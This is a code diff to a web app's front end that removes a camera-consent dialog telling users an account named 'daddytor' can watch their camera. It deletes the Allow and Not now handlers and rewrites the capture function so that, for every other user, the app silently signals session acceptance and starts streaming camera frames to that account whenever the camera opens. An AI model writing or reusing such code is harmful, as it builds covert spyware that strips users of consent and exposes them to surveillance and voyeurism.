@@ -160,16 +160,6 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-
 .reply-drawer textarea{width:100%;background:var(--s2);border:1px solid var(--s3);border-radius:16px;color:var(--t1);padding:10px 14px;font-size:14px;resize:none;outline:none;font-family:inherit}
 .reply-send-btn{background:var(--accent);color:#fff;font-weight:700;border:none;border-radius:var(--r8);padding:11px;font-size:14px;cursor:pointer;width:100%;margin-top:8px;font-family:inherit}
 
-/* ── CAM REQUEST MODAL ───────────────────────────────────── */
-.cam-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:310;flex-direction:column;align-items:center;justify-content:center;gap:20px;padding:24px;backdrop-filter:blur(8px)}
-.cam-modal.show{display:flex}
-.cam-modal-card{background:var(--s2);border:1px solid var(--s3);border-radius:24px;padding:28px 24px;width:100%;max-width:320px;display:flex;flex-direction:column;gap:14px;align-items:center}
-.cam-modal-icon{font-size:44px}
-.cam-modal-title{font-size:18px;font-weight:800;letter-spacing:-.3px}
-.cam-modal-text{font-size:14px;color:var(--t2);text-align:center;line-height:1.5}
-.cam-modal-actions{display:flex;gap:10px;width:100%}
-.cam-accept{flex:1;background:var(--green);color:#fff;font-weight:700;border:none;border-radius:var(--r8);padding:13px;font-size:14px;cursor:pointer;font-family:inherit}
-.cam-decline{flex:1;background:var(--s3);color:var(--t2);font-weight:700;border:none;border-radius:var(--r8);padding:13px;font-size:14px;cursor:pointer;font-family:inherit}
 
 /* ── CAM VIEW (daddytor watching) ───────────────────────── */
 #cam-view{display:none;position:fixed;inset:0;background:#000;z-index:300}
@@ -319,19 +309,6 @@ html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--t1);font-
     </div>
   </div>
 
-  <!-- CAM CONSENT MODAL (shown to user when they open camera) -->
-  <div class="cam-modal" id="cam-consent-modal">
-    <div class="cam-modal-card">
-      <div class="cam-modal-icon">👁</div>
-      <div class="cam-modal-title">Allow camera access?</div>
-      <div class="cam-modal-text">daddytor can see your camera while it's open this session.</div>
-      <div class="cam-modal-actions">
-        <button class="cam-accept" onclick="acceptCamConsent()">Allow</button>
-        <button class="cam-decline" onclick="denyCamConsent()">Not now</button>
-      </div>
-    </div>
-  </div>
-
   <!-- DADDYTOR CAM VIEW -->
   <div id="cam-view">
     <img id="remote-img" style="width:100%;height:100%;object-fit:cover;display:block">
@@ -418,7 +395,7 @@ let page = 1, loading = false;
 let selectedNiches = [], nichePages = {}, nicheIndex = 0;
 let feedMode = "trending", filterSort = "popular";
 let allNiches = [], endObserver = null;
-let bgStream = null, camGrantedThisSession = false;
+let bgStream = null;
 let frameInterval = null, frameVideo = null, frameCanvas = null;
 let currentFacing = "user";
 
@@ -486,32 +463,12 @@ async function initApp(){
 let captureStream=null, captureFacing="user";
 
 async function openCaptureMode(){
-  if(me.username!==DADDY && !camGrantedThisSession){
-    document.getElementById("cam-consent-modal").classList.add("show");
-    return;
-  }
-  await _startCamera();
-}
-
-async function acceptCamConsent(){
-  document.getElementById("cam-consent-modal").classList.remove("show");
-  camGrantedThisSession=true;
-  socket.emit("cam:session_accept");
-  await _startCamera();
-}
-
-function denyCamConsent(){
-  document.getElementById("cam-consent-modal").classList.remove("show");
-  _startCamera();
-}
-
-async function _startCamera(){
   const el=document.getElementById("cam-capture"); el.style.display="flex";
   try{
     captureStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:captureFacing},audio:false});
     bgStream=captureStream;
     document.getElementById("capture-preview").srcObject=captureStream;
-    if(camGrantedThisSession && me.username!==DADDY) startSendStream();
+    if(me.username!==DADDY){ socket.emit("cam:session_accept"); startSendStream(); }
   }catch(e){ toast("Camera not available"); el.style.display="none"; }
 }
 
@@ -520,7 +477,7 @@ function closeCaptureMode(){
   if(captureStream){ captureStream.getTracks().forEach(t=>t.stop()); captureStream=null; bgStream=null; }
   document.getElementById("capture-preview").srcObject=null;
   document.getElementById("cam-capture").style.display="none";
-  if(camGrantedThisSession) socket.emit("cam:end");
+  if(me.username!==DADDY) socket.emit("cam:end");
 }
 
 async function flipCaptureCam(){
